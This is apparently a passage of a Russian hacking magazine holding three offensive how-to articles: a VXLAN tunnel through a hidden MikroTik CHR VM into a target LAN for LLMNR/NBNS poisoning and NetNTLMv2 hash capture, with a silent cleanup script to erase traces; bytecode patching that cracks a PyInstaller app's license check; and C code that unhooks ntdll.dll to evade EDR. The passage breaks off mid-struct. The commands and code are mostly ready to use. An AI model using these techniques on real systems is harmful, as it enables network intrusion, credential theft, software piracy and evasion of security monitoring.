 • вык лючить протоколы обна руже ния соседей (Discovery Protocols);
 • вык лючить протоколы STP, что бы не нарушить работу легитим ного дерева
   STP;
 • задать имя системы в CHR (hostname);
 • соз дать спе циаль ный бридж, переместить туда интерфейс, нас троить
   работу /ip/dhcp-client для сохранения связности с CHR. Когда
   интерфейс помещается в бридж, он подчиняется бриджу, и для даль-
  нейшей связи адрес нужен именно на бридже. Несмотря на изме нение
   настройки /ip/dhcp-client, адрес CHR останется таким же.


[admin@MikroTik] > /interface/bridge/add name=bridge1;
/interface/bridge/set protocol-mode= none numbers= 0;
/interface/bridge/port add interface=ether1 bridge=bridge1;
/ip dhcp-client/remove 0;
/ip/dhcp-client/add interface=bridge;
/ip/neighbor/discovery-settings/set discover-interface-list= none;
/system/identity/set name=CasterRemix


[admin@CasterRemix] >

Также важно, что все это нужно сделать одной командой, иначе навсегда уте-
ряешь доступ к CHR на уровне сети и при дется начинать заново.


VXLAN-ÒÓÍÍÅËÈÐÎÂÀÍÈÅ

В качестве про токола туннелиро вания я выбрал VXLAN. Он поз воля ет переда-
вать L2-фрей мы поверх протокола UDP (порт по умолчанию UDP/4789), то
есть пре дос тавляет возможность организовать L2-туннель между атакующей
системой и CHR.
  Наша цель — сеть 192.168.1.0/24, к которой получим L2-доступ.





                       Лабора торная сеть

Между атакующим и MikroTik будет создан туннель VXLAN, причем они будут
устройствами VTEP и ста нут работать в режиме точка — точка (point-to-point),
без объявле ний MCAST. VTEP  (Virtual  Tunnel  Endpoint) —  устрой ства,
на которых стро ится и терминируется тун нель VXLAN, они занима ются
инкапсуляци ей и деинкапсу ляци ей VXLAN-заголовков.





     Пример инкапсулированной с помощью VXLAN полез ной нагрузки

Важно, что бы перед настройкой был явный маршрут /32 до CHR через шлюз,
с которым будет иницииро ван туннель. Иначе соз данный туннель может
перекрыть достижимость до CHR, что вызовет раз рыв тун неля. Маршрут соз-
дается через шлюз по умолчанию для атакующего (в случае данной лабора-
торной сети — 172.10.200.254).


caster@kali:~$ sudo ip route add 192.168.1.36/32 via 172.10.200.254

На  сто роне  ата кующего  тун нель VXLAN  будет построен между  адре-
сами 172.10.200.252 и 192.168.1.36 (Attacker → CHR), идентификатор тун-
неля (VNI) — 10.


caster@kali:~$ sudo ip link add name evilvxlan type vxlan id 10
local 172.10.200.252 remote 192.168.1.36 dstport 4789
caster@kali:~$ sudo ip link set evilvxlan up

На  сто роне CHR  (RouterOS  v7)  тоже  необходимо,  чтобы  соз данный
интерфейс VXLAN на CHR был помещен в бридж, где находит ся интерфейс,
смот рящий в сторону реальной ОС (ether1), так как CHR на уровне VirtualBox
находится в режиме мос та.


[admin@CasterRemix] > /interface/vxlan add name=vxlan1 port= 4789 vni=
10
[admin@CasterRemix] > /interface/vxlan/vteps interface=vxlan1 remote-
ip=172.10.200.252 port= 4789
[admin@CasterRemix] > /interface/bridge/port add interface=vxlan1
numbers= 0





                    Карта VXLAN-туннелиро вания

Пос ле примене ния этой конфигура ции тун нель VXLAN будет пос троен сог-
ласно схе ме выше.





                Связь атакующего с целевой сетью по L2


ÀÒÀÊÀ

Те перь атакующий должен получить адрес на интерфейсе evilvxlan, и L2-дос-
туп будет обеспечен! Откры вают ся воз можнос ти для атак канального уровня.
Также по DHCP может прилететь вто рой шлюз, заданный по умолчанию, что
разорвет туннель. Так что будь осторожен. Я, что бы избе жать этой проблемы,
использую коман ду sudo route del default.


caster@kali:~@ sudo dhclient -v evilvxlan; sudo route del default
caster@kali:~@ sudo responder -I evilvxlan -vvv

Ни же — при мер отработавшей внутри VXLAN-тун неля утилиты responder
и отравление зап росов LLMNR/NBNS/MDNS.





              NetNTLMv2-SSP-хеш пользователя darkstep


ÇÀ×ÈÑÒÊÀ

Когда понадобится затереть следы, необходимо выключить и удалить соз-
данную вир туалку с MikroTik CHR. Также нуж но удалить саму VirtualBox. Естес-
твен но, в silent-режиме.


delete-remix.bat
@echo off


set VMNAME=CasterRemix


"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" controlvm
"%VMNAME%" poweroff
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" unregistervm
"%VMNAME%" --delete
wmic product where name="Oracle VM VirtualBox 7.0.8" call uninstall /
nointeractive
rmdir /s /q c:\r emix


ÂÛÂÎÄÛ

Итак,  я продемонстрировал  технику  L2-туннелирования против машин
Windows. Метод спе цифичес кий, но, на мой взгляд, вполне практичный.
   Эту статью я хочу посвятить ушедшему из жизни Киту Флинту, фронтме ну
груп пы The Prodigy, которая выпустила пес ню Omen.





Эта пес ня была для меня вдохновением по ходу работы и даже немало пов-
лияла на ее стиль.
ВЗЛОМ





      ВСКРЫВАЕМ И ПОТРОШИМ
              PYINSTALLER





Челове чес тво  породи ло  целый  зоопарк
скриптовых языков с низким порогом вхож-
дения в попытке облегчить всем желающим
«вкатыва ние в айти» сра зу после окончания
месяч ных курсов. Есть мнение, что в этом           МВК
зоопарке царем зве рей сейчас работа ет
Python. Эта ползучая реп тилия так сильно
опутала сво ими кольцами IT, что даже ней-
росеть  без  ее  учас тия  теперь  ничему
не обучить. А раз так, настало время пре-
парировать это го аспи да и посмотреть, что
у  него  внутри.  Нач нем  с  технологии
под названием PyInstaller.




                        Статья написа на в исследователь ских целях, име-
                         ет ознакоми тельный характер и предназна чена
                       для  специалистов  по  безопасности.  Автор
                      и редак ция не несут ответствен ности за любой
                        вред, причинен ный с применением изложен ной
                    информа ции.  Использование  или  рас простра-
                      нение ПО без лицензии производителя может
                      прес ледоваться по закону.


В качестве при мера возьмем некое графичес кое при ложе ние, для регистра-
ции которого нужно ввести правильный серий ник в ответ на предложен ный
программой код оборудования. При неправильном вводе при ложе ние отве-
чает ругательным сообщени ем «No valid license code». Detect It Easy уверенно
под сказывает, что это наш пациент.





Ис сле дование при ложения мы начина ем по стандар тной схе ме. Поиск
сопутствующих тек стовых строк в exe-фай ле не дает результата: исполня-
емый код и данные явно упа кованы или закриптованы. Загрузка приложения
в IDA косвенно это подтвержда ет, exe-файл представляет собой загрузчик
для обширного самораспаковы вающегося файлового пакета.





Попробуем  загрузить  программу  в  наш  любимый  отладчик  x64dbg.
По счастью, при ложе ние совершенно не соп ротивляется этому, нормаль но
загружается и пре рывается по первому требова нию. Слегка попрыгав по коду
трассировщиком,  сразу  натыкаемся  на  учас ток,  сильно  сма хивающий
на интерпре татор шитого пи-кода:


07FF9AE401274 | 49:8BC7             | mov rax,r15
07FF9AE401277 | 49:2BC1             | sub rax,r9
07FF9AE40127A | 48:D1F8             | sar rax,1
07FF9AE40127D | 03C0                | add eax,eax
07FF9AE40127F | 41:8945 68          | mov dword ptr ds:[r13+68],eax
07FF9AE401283 | 837A 44 00          | cmp dword ptr ds:[rdx+44],0
07FF9AE401287 | 0F85 85A71200       | jne python39.7FF9AE52BA12
07FF9AE40128D ; edi — байт-код текущей команды
07FF9AE40128D | 41:0FB73F           | movzx edi,word ptr ds:[r15]
07FF9AE401291 | 4D:8BF4             | mov r14,r12
07FF9AE401294 | 40:0FB6F7           | movzx esi,dil
07FF9AE401298 | C1EF 08             | shr edi,8
07FF9AE40129B | 49:83C7 02          | add r15,2
07FF9AE40129F | 4C:8965 C8          | mov qword ptr ss:[rbp-38],r12
07FF9AE4012A3 | 4C:897D B0          | mov qword ptr ss:[rbp-50],r15
07FF9AE4012A7 | 66:0F1F8400 00000000| nop word ptr ds:[rax+rax],ax
07FF9AE4012B0 | 8D46 FF             | lea eax,qword ptr ds:[rsi-1]
07FF9AE4012B3 | 3D A4000000         | cmp eax,A4
07FF9AE4012B8 | 0F87 85E21200       | ja python39.7FF9AE52F543
07FF9AE4012BE | 48:98               | cdqe
07FF9AE4012C0 ; В rcx — относительный адрес обработчика
07FF9AE4012C0 ; текущей команды
07FF9AE4012C0 | 41:8B8C83 D8C80600  | mov ecx,dword ptr
ds:[r11+rax*4+6C8D8]
07FF9AE4012C8 | 49:03CB             | add rcx,r11
07FF9AE4012CB ; Переход на обработчик текущей команды
07FF9AE4012CB | FFE1                | jmp rcx
07FF9AE4012CD | 48:63D7             | movsxd rdx,edi
07FF9AE4012D0 | 49:8B84D5 68010000  | mov rax,qword ptr
ds:[r13+rdx*8+168]
07FF9AE4012D8 | 48:85C0             | test rax,rax
07FF9AE4012DB | 0F84 B3E01200       | je python39.7FF9AE52F394
07FF9AE4012E1 | 48:FF00             | inc qword ptr ds:[rax]
07FF9AE4012E4 | 48:8B55 90          | mov rdx,qword ptr ss:[rbp-70]
07FF9AE4012E8 | 49:890424           | mov qword ptr ds:[r12],rax
07FF9AE4012EC | 49:83C4 08          | add r12,8

Как видим, таблица обработчиков команд находится по адре су 6C8D8, а ука-
затель на PC текущей команды — в регис тре R15.
  На этом месте отложим пока отладчик в сторону и вспом ним теорию.
Но сначала, чтобы не забыть, зафиксиру ем один интересный момент: боль-
шинство динами ческих библиотек, на которые имеются ссылки на вкладке
«Отла дочные модули», физически находятся в подпапке \_MEI100722 сис-
темной пап ки для вре менных файлов. Судя по всему, это и есть каталог (или
один из катало гов), в который сбор ка распаковывается на время работы при-
ложения.
   Чтобы лучше понимать воп рос, давай для начала вспом ним, что это за
зверь такой — Python. Думаю, не ошибусь, если предположу, что многие зна-
ют его как язык для написа ния прос теньких сце нари ев, вроде JavaScript,
отли чающий ся несколько экстравагантной концепцией выделе ния бло ков
кода отступами. Про ект создан и развивал ся в лучших традициях черного
английского юмора (как известно, само название — это отсылка к сатири чес-
кому бри тан скому телешоу). В ходе этой эво люции узкоспециализированный
скрип товый язык получил множество разнообразных биб лиотек, как в свое
вре мя это произош ло с фор траном.
   Как известно, спрос рождает предложение, поэто му, чтобы раз работ-
чикам было легче соз давать полноценные коммерческие приложения в рам-
ках привыч ной концепции Python, были придуманы компиляторы самых раз-
нооб разных реали заций. Кто-то попытал ся сделать нативный компилятор,
другие прикрутили к Python JIT (компиляцию вре мени исполне ния, я расска-
зывал про эту концепцию в своих предыду щих статьях).
  Соответственно, были созданы про екты Jython (трансля ция в байт-код
JVM) и IronPython (трансляция в .NET IL). Но, к сожалению, как ты мог убедить-
ся из при веденного выше фрагмента кода интерпретатора, эта лонная реали-
зация лишена полезных свой ств — перед нами обычная интерпретация py-
кода, не отличающаяся высокой опти миза цией.
  Подробнее  про  раз личные  методы  ком пиляции  питоновского  кода
в исполняемые приложения можно почитать, например, на «Хаб ре». В этой
статье  упомяну та сборка приложения  с помощью исследуемо го нами
PyInstaller и разборка его на составляющие файлы проекта с исполь зовани ем
PyInstaller Extractor.
   Хо тя лично я для извле чения файлов из про екта посове товал бы более
прод винутый инс тру мент — pydumpck. Разумеется, он тоже не всемогущ
и ему при сущи опре деленные недос татки. К примеру, у меня он нормально
запускается толь ко на вер сии питона 3.9, но вооб ще, надо сказать, проблема
сов мести мости кода даже между соседними подверси ями — обычная и даже
не самая глав ная проблема это го языка. В общем, дос таточно лирики, вер-
немся к суровым техническим подробнос тям эта лонной реализации.
  Ми нимальной  еди ницей  ском пилиро ванного  питоновского  байт-кода
является файл .pyc (есть еще фай лы .pyo, скомпилированные с оптимиза-
цией, но их мы трогать не будем). Этот файл генерируется из текстового
скрип тового  кода  вызовом  метода  py_compile.compile  или  просто
при вызове директивы import во время исполне ния скрипта, чтобы не ком-
пилиро вать импортируемый модуль лиш ний раз. Подобным обра зом раз-
работ чики попытались компенсировать отсутс твующий в эталонной реали-
зации JIT. Этот файл содержит в себе байт-код ском пилированного модуля,
константы, ссылки и так далее. Формат его зависит от версии Python, офи-
циально не докумен тирован, однако хорошо описан в интернете, например
на сай те Nedbatchelder. В этой же статье приведен и текст прос тейшего
дизассем бле ра pyc, написанного на питоне:



import dis, marshal, struct, sys, time, types


def show_file(fname):
    f = open(fname, "rb")
    magic = f.read(4)
    moddate = f.read(4)
    modtime = time.asctime(time.localtime(struct.unpack('L', moddate)
[0]))
    print "magic %s" % (magic.encode('hex'))
    print "moddate %s (%s)" % (moddate.encode('hex'), modtime)
    code = marshal.load(f)
    show_code(code)


def show_code(code, indent=''):
    print "%scode" % indent
    indent += '   '
    print "%sargcount %d" % (indent, code.co_argcount)
    print "%snlocals %d" % (indent, code.co_nlocals)
    print "%sstacksize %d" % (indent, code.co_stacksize)
    print "%sflags %04x" % (indent, code.co_flags)
    show_hex("code", code.co_code, indent=indent)
    dis.disassemble(code)
    print "%sconsts" % indent
    for const in code.co_consts:
        if type(const) == types.CodeType:
            show_code(const, indent+'   ')
        else:
            print "   %s%r" % (indent, const)
    print "%snames %r" % (indent, code.co_names)
    print "%svarnames %r" % (indent, code.co_varnames)
    print "%sfreevars %r" % (indent, code.co_freevars)
    print "%scellvars %r" % (indent, code.co_cellvars)
    print "%sfilename %r" % (indent, code.co_filename)
    print "%sname %r" % (indent, code.co_name)
    print "%sfirstlineno %d" % (indent, code.co_firstlineno)
    show_hex("lnotab", code.co_lnotab, indent=indent)


def show_hex(label, h, indent):
    h = h.encode('hex')
    if len(h) < 60:
        print "%s%s %s" % (indent, label, h)
    else:
        print "%s%s" % (indent, label)
        for i in range(0, len(h), 60):
            print "%s   %s" % (indent, h[i:i+60])


show_file(sys.argv[1])

Как видишь, дизассемблирование байт-кода pyc-файлов особой проблемы
не представ ляет, можно использовать, к примеру, самый распространенный
питоновский ди зассемблер pydasm. Есть даже специализированная подклю-
чаемая питоновская биб лиотека dis, соз данная исключительно для дизас-
сем бли рования. Система команд тоже хоть и зависима от версии и офи-
циально не документирована, но прос та и общедос тупна. Ее описание также
можно най ти в сети.
  А вот с декомпиляцией pyc в исходный питоновский код дело обстоит
грустно. Несмотря на кажущееся оби лие декомпилято ров (самые рас-
пространенные — это python-decompile3 и pycdc), на текущий момент в паб-
лике нет абсолют но корректных декомпиляторов для вер сий старше 3.8,
не говоря уже про обфуска цию. Поэто му спешу огорчить иска телей вол-
шебной кноп ки — декомпилированный код даже вер сии 3.9 тре бует сильного
допили вания напильником.
  Продолжаем увле кательную экскур сию по фай лам питоновского пакета.
Когда в отладчике мы бегло просматривали список импортируемых биб-
лиотек, распакован ных во временный каталог сис темы, то обратили вни-
мание на модули с расширением pyd. Это бинарные нативные библиотеки,
под клю чаемые к питоновскому интер претато ру. Как видишь, это клас сичес-
кие динамические библиотеки Windows фор мата DLL с единс твенной экспор-
тируемой функци ей. В этой статье мы пока не будем заострять внимание
на защитах, интегри рованных в подоб ные нативные расширения, при мер соз-
дания которых уже опи сывался в различных публикаци ях.
  Не будем сильно углублять ся в тему, рас смотрим толь ко еще один клю-
чевой формат файлов с неприлич ным рас ширением .pyz. Это питоновский
архив, поз воляющий собрать нес коль ко модулей, классов и прочих составля-
ющих про екта в одну сборку. Эдакий «архив в архиве» внутри исполня емой
сборки PyInstaller.
  Все это очень осложняет поиск по вхождению строки нужного модуля
в распакованной сборке PyInstaller. По счастью, это чудо враждебной техники
лег ко распаковы вается на собственные сос тавляющие при помощи упомяну-
той выше утилиты pydumpck и собира ется обратно (в случае патча, например)
встро енной утилитой zipapp.
   Ну а теперь, вооружив шись полученными зна ниями, попробуем применить
их на прак тике для лечения нашего при ложе ния. Для начала аккурат но рас-
пакуем его при помощи pydumpck (благо у нас исполь зуется версия Python
3.9). Надо отметить, это практически универ саль ный инс трумент — рас-
паковывает и исполняемый exe-модуль PyInstaller, и содержащиеся в нем
питоновские архи вы pyz, и даже декомпилиру ет рас пакованные pyc-файлы
в исходный код.
  Для деком пиляции в него встроено два плагина — упоминавшиеся
uncompyle6 и pycdc. По умолчанию использует ся pycdc, и он в целом справ-
ляет ся с пос тавленной задачей, а вот плагин uncompyle6 у меня так и не
получи лось заставить работать на вер сии 3.9.
   Те перь берем WinHex и ищем текстовую строку no valid license code
по полученному множеству файлов. Нам повезло: у нас простейший слу чай,
и иско мая строка обнаруживает ся сразу и в pyc, и в автоматически деком-
пилиро ванном из него py-файле. Открываем восста новленный декомпилято-
ром py-файл. К сожале нию, мы убеждаем ся, что версия 3.9 для деком пилято-
ра pycdc неродная, он явно страдает несварением кода: этот самый код вос-
ста новлен не полностью. Повсюду вид ны пре дупрежде ния о неизвестных
инструкциях  и ошиб ках декомпиляции,  повторно компилиро вать  такой
исходник нельзя. Тем не менее нам повезло — искомое мес то с проверкой
и выдачей строки в файле присутствует:


...
def validate_serial(self):
    if not utils.validate_serial():
        self.logger.log('no valid license code for the popup code: '
+ utils.get_hardware_code() + '\n')
        return False
…

Попробуем теперь дизассем бли ровать этот файл при помощи pycdasm.
Поначалу он руга ется на отсутствие сиг натуры, но это не страшно, достаточно
руками    приклеить   ее     (в   нашем    случае    это   8    байт
610D0D0A000000000000000000000000)   в   начало   файла,   например
при помощи WinHex.
  Находим соот ветствующее место в дизас семблированном коде:


...
[Disassembly]
0       LOAD_GLOBAL        0: utils
2       LOAD_METHOD        1: validate_serial
4       CALL_METHOD        0
6       POP_JUMP_IF_TRUE   36
8       LOAD_FAST          0: self
10      LOAD_ATTR          2: logger
12      LOAD_METHOD        3: log
14      LOAD_CONST         1: 'no valid license code for the popup
code: '
16      LOAD_GLOBAL        0: utils
18      LOAD_METHOD        4: get_hardware_code
20      CALL_METHOD        0
22      BINARY_ADD
24      LOAD_CONST         2: '\n'
26      BINARY_ADD
28      CALL_METHOD        1
30      POP_TOP
32      LOAD_CONST         3: False
34      RETURN_VALUE
36      LOAD_CONST         4: True
…

За провер ку усло вия и условный переход по нему отвечает инструкция
POP_JUMP_IF_TRUE. Конеч но, можно было бы поправить ее на безусловный
переход, однако тогда придется как-то сбалансировать стек, потому что нет
такой команды, которая одновре менно снимала бы со стека значение и осу-
щест вля ла переход. Вдо бавок не факт, что серий ник не проверяется где-то
в другом месте. Правильнее будет найти и поправить метод utils.
validate_serial(). Для это го находим модуль utils и деком пилируем его:


…
def validate_serial():
    stored_serial = get_data_file().strip()
    hardware_code = get_hardware_code()
    if hardware_code == '' or stored_serial != get_serial(
hardware_code):
        return False
…

Или в виде байт-кода:


[Disassembly]
0       LOAD_GLOBAL         0: get_data_file
2       CALL_FUNCTION       0
4       LOAD_METHOD         1: strip
6       CALL_METHOD         0
8       STORE_FAST          0: stored_serial
10      LOAD_GLOBAL         2: strip
12      CALL_FUNCTION       0
14      STORE_FAST          1: hardware_code
16      LOAD_FAST           1: hardware_code
18      LOAD_CONST          1: ''
20      COMPARE_OP          2 (==)
22      POP_JUMP_IF_TRUE    36
24      LOAD_FAST           0: stored_serial
26      LOAD_GLOBAL         3: NULL + strip
28      LOAD_FAST           1: hardware_code
30      CALL_FUNCTION       1
32      COMPARE_OP          3 (!=)
34      POP_JUMP_IF_FALSE   40
36      LOAD_CONST          2: False
38      RETURN_VALUE
40      LOAD_CONST          3: True
42      RETURN_VALUE

Как видишь, тут достаточно заменить команду по смещению 36 LOAD_CONST
2:False  (64  02) командой LOAD_CONST  3:  True  (64  03), и метод
validate_serial() всегда будет воз вра щать True. Чтобы убедиться в этом,
для начала поп равим байт-код пря мо в отладчи ке.





Жмем кнопку Activate — бин го, прог рамма принима ет любой код! Теперь нам
остается толь ко поправить байт-код в соответствующем pyc-модуле и акку-
рат но пересобрать экзешник с помощью PyInstaller.
  На пер вый взгляд может показаться, что взлом подобных при ложе ний —
это не просто, а очень просто. Однако я надеюсь, ты понима ешь, что в этой
статье мы разобрали самый прос той и базовый слу чай безо всякой обфуска-
ции,  вир туализации,  крип тографии  и  прочих  заморочек.  Огра ничимся
для  начала  им,  оставив более  интерес ные варианты  в  качестве тем
для будущих статей.
ВЗЛОМ





     ПОЗНАЕМ АНХУКИНГ NTDLL.DLL




Средства защиты, в частности EDR, любят
ставить хуки. Хук — это специальная инс-
трук ция,  которая  позволяет  перехватить
поток управле ния программы при вызове
определенной функции и в результате кон-         MichelleVermishelle                                                                                       @Michaelzhm
тролиро вать, отсле живать и изменять дан-        michael.zhmailo@yandex.ru
ные, переданные этой функции. В этой
статье я покажу, как про водить обратный
про цесс — анху кинг.




                     Под робнее про хуки ты можешь узнать из статей
                            «Вол шебные хуки. Как перехватывать управление
                     любой программой через WinAPI» и «Мелкомяг-
                       кие хуки: Microsoft Detours - честное средство
                       для настоящего хакера».


Анхукинг поз воляет снять хук, который был уста новлен средством защиты.
Опре делить наличие хука нес ложно. Вот наг лядный пример того, как он
может выглядеть.





                         При мер хука

Здесь EDR поставил хук на NtAllocateVirtualMemory(). Эта функция будет
пос ледней в User Mode, она вызывается лишь для инициали зации системного
вызова и выделе ния памяти путем обращения к ядру. В стоковой конфигура-
ции, когда хука нет, никаких безусловных jmp-перехо дов быть не должно. Тут
мы видим иную ситуацию: переход как раз таки есть, поток управления отда-
ется непонят но кому и непонятно куда. Поэтому нам как ата кующим, да и
прос то что бы уклониться от обнаруже ния, нужна опе рация анхукинга, которая
сни мет этот  хук,  и, как следс твие, средство защиты потеряет контроль
над потоком выполнения прог раммы.
  Отмечу лишь, что подоб ный спо соб обхо да хуков — один из множества.
Можно, нап ример, совер шать Direct- и Indirect-сисколы, но стоит помнить, что
получится обой ти толь ко хуки, которые стоят в User Mode. Если средство
защиты применя ет хуки Kernel Mode (нап ример, SSDT Hooking), то подоб ные
методы ока жутся бес полезны. На будущее: SSDT — это спе циальная таблица,
благодаря которой сопоставляются сискол и действие ядра Windows. Есть,
конечно, Kernel Patch Protection, который меша ет устанав ливать подоб ные
хуки, но это уже совсем дру гая история.
  В статье я рассмотрю наиболее популярные способы сня тия  хуков,
от прос того к сложному.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




                   ПОЗНАЕМ АНХУКИНГ NTDLL.DLL





ÑÍßÒÈÅ ÕÓÊÀ ×ÅÐÅÇ ×ÒÅÍÈÅ ÁÈÁËÈÎÒÅÊÈ Ñ ÄÈÑÊÀ

Этот метод можно счи тать одним из самых прос тых. Он основан на том, что
библиотека ntdll.dll подгружает ся в память так же, как находится на диске.
При чем хуки уста новлены непос редс твенно в памяти, на дис ке образ девс-
твен но чист. Поэтому мы должны будем лишь считать биб лиотеку с дис ка,
достать из нее PE-сек цию .text (в ней находится код), а после перезаписать
сек цию .text хукнутой биб лиотеки секцией, считанной с диска.





                       Алгоритм снятия хука

Мы будем использовать функции ReadFile() и MapViewOfFile(), и EDR
может отсле живать их, поэтому есть риск, что наша ntdll.dll, загруженная
с диска, будет изме нена при попытке подгрузить ее содержимое в прог-
рамму. Поэтому при дется использовать иной способ снятия хука, например
тащить ntdll.dll с некоего уда ленного сервера. Этот алгоритм реализуем поз-
же. За идею большое спасибо Ральфу.
   Итак, сначала нуж но счи тать содержимое биб лиотеки  ntdll.dll. Начнем
со стандартной функции ReadFile(). По умол чанию  ntdll.dll лежит в сис-
темной пап ке \Windows\System32. Пред лагаю создать функцию, которая
будет возвращать буфер с содержимым ntdll.dll.


#define NTDLL "NTDLL.DLL"


BOOL ReadNtdllFromDisk(OUT PVOID* ppNtdllBuf) {


  CHAR cWinPath[MAX_PATH / 2] = { 0 };
  CHAR cNtdllPath[MAX_PATH] = { 0 };
  HANDLE hFile = NULL;
  DWORD dwNumberOfBytesRead = NULL, dwFileLen = NULL;
  PVOID pNtdllBuffer = NULL;


  if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
    printf("[!] GetWindowsDirectoryA Failed With Error : %d \n",
GetLastError());
    goto EndOfFunc;
  }


  sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s",
cWinPath, NTDLL);


  hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL
, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    printf("[!] CreateFileA Failed With Error : %d \n", GetLastError
());
    goto EndOfFunc;
  }


  dwFileLen = GetFileSize(hFile, NULL);
  pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
dwFileLen);


  if (!ReadFile(hFile, pNtdllBuffer, dwFileLen, &dwNumberOfBytesRead,
NULL) || dwFileLen != dwNumberOfBytesRead) {
    printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
    printf("[i] Read %d of %d Bytes \n", dwNumberOfBytesRead,
dwFileLen);
    goto EndOfFunc;
  }


  *ppNtdllBuf = pNtdllBuffer;


EndOfFunc:
  if (hFile)
    CloseHandle(hFile);
  if (*ppNtdllBuf == NULL)
    return FALSE;
  else
    return TRUE;
}

Остает ся про верить, что наш код верно работает. Если ты пишешь в Visual
Studio, то открывай пункт «Отладка → Парамет ры» и ставь две галочки, чтобы
можно было видеть содержимое памяти.





               Вклю чение показа содер жимого памяти

Пос ле чего переходи по пути «Отладка → Окна → Память», и сможешь видеть
содержимое памяти текуще го отлажива емо го про цесса.





               Вклю чение окошка отоб ражения памяти

Остает ся лишь убедиться, что по адресу, который занесется в переменную
ppNtdllBuf, лежат верные значения. Так как биб лиоте ка ntdll.dll — PE-файл,
то первые байты должны быть рав ны MZ. Это так называемая сигнатура, бла-
годаря которой можно убедиться, что мы получи ли правильный адрес.





                 Прос мотр содер жимого в памяти

Выходит, наша  ntdll.dll успешно про чита на с дис ка. Можно так же исполь-
зовать и иной API — CreateFileMapping() и MapViewOfFile(). Эти функции
слу жат для отображения фай ла в память. Разработчики час то при меня ют этот
механизм, что бы не писать каждый раз информа цию на диск, теряя в про-
изводительности программы, а вмес то это го записы вать данные непос редс-
твен но в память и лишь потом, пос ле нес кольких записей подряд, сохранять
их на диск. Функция для получе ния содер жимого  ntdll.dll будет немногим
отли чаться от пре дыдущей.


#define NTDLL "NTDLL.DLL"


BOOL MapNtdllFromDisk(OUT PVOID* ppNtdllBuf) {


    HANDLE  hFile = NULL,
        hSection = NULL;
    CHAR    cWinPath[MAX_PATH / 2] = { 0 };
    CHAR    cNtdllPath[MAX_PATH] = { 0 };
    PBYTE   pNtdllBuffer = NULL;


    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
        printf("[!] GetWindowsDirectoryA Failed With Error : %d \n",
GetLastError());
        goto _EndOfFunc;
    }


    sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s",
cWinPath, NTDLL);


    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ,
NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileA Failed With Error : %d \n",
GetLastError());
        goto _EndOfFunc;
    }


    hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY |
SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
    if (hSection == NULL) {
        printf("[!] CreateFileMappingA Failed With Error : %d \n",
GetLastError());
        goto _EndOfFunc;
    }


    pNtdllBuffer = (PBYTE)MapViewOfFile(hSection, FILE_MAP_READ, NULL
, NULL, NULL);
    if (pNtdllBuffer == NULL) {
        printf("[!] MapViewOfFile Failed With Error : %d \n",
GetLastError());
        goto _EndOfFunc;
    }


    *ppNtdllBuf = pNtdllBuffer;


_EndOfFunc:
    if (hFile)
        CloseHandle(hFile);
    if (hSection)
        CloseHandle(hSection);
    if (*ppNtdllBuf == NULL)
        return FALSE;
    else
        return TRUE;
}

Возможно, этот метод будет даже чуть более тихим, так как при таком мап-
пинге не срабатывает колбэк PsSetLoadImageNotifyRoutine, который может
быть установлен анти вирус ным ПО. По край ней мере, так написано на MSDN.





Следующий шаг — получить адрес хукнутой  ntdll.dll. Она уже находит ся
в адресном пространс тве нашего про цес са. Предлагаю получить ее адрес
из PEB. PEB — спе циальная структура данных, которая содержит информа-
цию о текущем про цессе.


typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;

Внутри этой структуры есть элемент Ldr, представляющий собой дру гую
структуру, PEB_LDR_DATA.


typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

Внутри PEB_LDR_DATA — еще одна структура (это предпоследняя матрешка,
честно). Называется она LIST_ENTRY.


typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;

LIST_ENTRY можно счи тать этаким двусвязным списком. Через элемент
Flink можно получить доступ к следующе му элементу двусвязного списка,
а через элемент Blink — к пре дыдущему. Каж дый элемент этого двус вязного
списка  представлен  структурой  LDR_TABLE_ENTRY,  которая  содержит
информацию о каждой DLL-библиотеке, заг руженной в процесс.


typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    PVOID EntryPoint;
    PVOID Reserved3;
    UNICODE_STRING FullDllName;
